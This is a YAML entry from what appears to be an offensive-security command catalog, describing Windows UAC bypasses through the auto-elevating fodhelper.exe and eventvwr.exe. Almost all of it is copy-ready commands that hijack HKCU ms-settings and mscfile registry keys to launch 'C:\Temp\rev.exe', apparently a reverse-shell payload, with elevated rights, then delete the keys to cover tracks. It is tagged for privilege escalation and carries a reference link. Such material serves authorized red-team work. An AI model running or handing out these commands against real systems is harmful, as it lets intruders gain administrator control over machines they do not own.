---
description: |
  Bypass Windows User Account Control (UAC) using auto-elevating binaries like fodhelper.exe and eventvwr.exe. Works mostly on Windows 10.
commands:
  - have: Shell
    cmd: |
      # NOTE: UAC bypass requires user to be in Administrators group
      # but running in a medium-integrity (non-elevated) context.
      # Works mostly on Windows 10.

      # ============================================================
      # METHOD 1: Fodhelper UAC Bypass
      # ============================================================

      # Set the registry key to hijack fodhelper auto-elevation
      reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "C:\Temp\rev.exe" /f

      # Add DelegateExecute value (required for the hijack to work)
      reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f

      # Trigger the bypass — fodhelper.exe auto-elevates and loads our command
      fodhelper.exe

      # Clean up registry after getting elevated shell
      reg delete HKCU\Software\Classes\ms-settings\Shell\Open\command /f

      # ============================================================
      # METHOD 2: Eventvwr UAC Bypass
      # ============================================================

      # Set the registry key to hijack eventvwr auto-elevation
      reg add HKCU\Software\Classes\mscfile\Shell\Open\command /d "C:\Temp\rev.exe" /f

      # Add DelegateExecute value
      reg add HKCU\Software\Classes\mscfile\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f

      # Trigger the bypass — eventvwr.exe auto-elevates and loads our command
      eventvwr.exe

      # Clean up registry after getting elevated shell
      reg delete HKCU\Software\Classes\mscfile\Shell\Open\command /f
phase:
  - PrivEsc
target_os:
  - Windows
services: []
techniques:
  - UAC_Bypass
references:
  - https://book.hacktricks.xyz/windows-hardening/authentication-credentials-uac-and-efs/uac-user-account-control
---
